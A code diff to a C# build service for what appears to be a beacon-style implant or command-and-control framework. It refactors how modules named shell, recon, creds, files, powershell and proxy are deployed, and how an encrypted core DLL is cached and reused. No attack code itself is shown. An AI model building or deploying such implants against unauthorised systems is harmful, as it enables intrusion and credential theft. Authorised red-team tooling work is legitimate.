@@ -21,6 +21,9 @@ internal class BuildContext
     public bool IsWindows { get; set; }
     public bool IsMacos { get; set; }
     public bool IsCross { get; set; }
+    public bool SkipCompile { get; set; }
+    public bool ForceRebuild { get; set; }
+    public string ModulesDir { get; set; } = "";
     public Dictionary<string, string> EnvVars { get; set; } = new();
     public string CoreDllPath { get; set; } = "";
     public string ExePath { get; set; } = "";
@@ -93,24 +96,11 @@ public partial class BuilderBuildService
     // Stage 1.6: Build cloud modules for this platform
     // ══════════════════════════════════════════════════════════════════
 
-    // Module name -> cdylib lib target name (as produced by cargo).
-    // The deployed file is named {moduleName}.{ext} and is fetched by the
-    // agent via /api/beacon/module/{moduleName}.
-    private static readonly (string Module, string Lib)[] CloudModules =
-    [
-        ("shell", "shell_module"),
-        ("recon", "recon_module"),
-        ("creds", "creds_module"),
-        ("files", "files_module"),
-        ("powershell", "powershell_module"),
-        ("proxy", "proxy_module"),
-    ];
-
     private static async Task Stage1_6_BuildModuleAsync(BuildContext ctx, string targetArg, BuildJob job)
     {
         job.Log($"=== Stage 1.6: Building cloud modules ({ctx.TargetTriple}) ===");
 
-        var packages = string.Join(" ", CloudModules
+        var packages = string.Join(" ", BuilderBuildService.CloudModules
             .Select(m => m.Lib.StartsWith("shell_") ? "-p shell-module" : $"-p {m.Module}-module")
             .Distinct());
 
@@ -122,9 +112,9 @@ public partial class BuilderBuildService
             return;
         }
 
-        Directory.CreateDirectory(ModulesDir);
+        Directory.CreateDirectory(ctx.ModulesDir);
         var deployed = 0;
-        foreach (var (moduleName, libName) in CloudModules)
+        foreach (var (moduleName, libName) in BuilderBuildService.CloudModules)
         {
             var artifact = ctx.IsWindows
                 ? $"{libName}.dll"
@@ -140,7 +130,7 @@ public partial class BuilderBuildService
             }
             if (System.IO.File.Exists(modulePath))
             {
-                System.IO.File.Copy(modulePath, Path.Combine(ModulesDir, $"{moduleName}.{ctx.ModuleExt}"), true);
+                System.IO.File.Copy(modulePath, Path.Combine(ctx.ModulesDir, $"{moduleName}.{ctx.ModuleExt}"), true);
                 job.Log($"Deployed {moduleName}.{ctx.ModuleExt}");
                 deployed++;
             }
@@ -149,7 +139,7 @@ public partial class BuilderBuildService
                 job.Log($"[WARN] {moduleName} module binary not found after build");
             }
         }
-        job.Log($"Cloud modules deployed: {deployed}/{CloudModules.Length} -> build-output/modules/");
+        job.Log($"Cloud modules deployed: {deployed}/{BuilderBuildService.CloudModules.Length} -> {ctx.ModulesDir}");
     }
 
     // ══════════════════════════════════════════════════════════════════
@@ -159,6 +149,17 @@ public partial class BuilderBuildService
     private static async Task Stage2_EncryptCoreAsync(BuildContext ctx, BuildJob job)
     {
         job.Log("=== Stage 2: Encrypting Core DLL ===");
+
+        if (ctx.SkipCompile)
+        {
+            // Prebuilt artifacts: reuse the cached core.bin and its key.
+            var binPath = Path.Combine(ctx.TempDir, "core.bin");
+            var keyPath = Path.Combine(ctx.TempDir, "core.key");
+            ctx.EncryptedCore = await System.IO.File.ReadAllBytesAsync(binPath);
+            ctx.AesKey = await System.IO.File.ReadAllBytesAsync(keyPath);
+            job.Log($"Reusing cached core.bin ({ctx.EncryptedCore.Length / 1024} KB)");
+            return;
+        }
 
         var coreDllBytes = await System.IO.File.ReadAllBytesAsync(ctx.CoreDllPath);
 
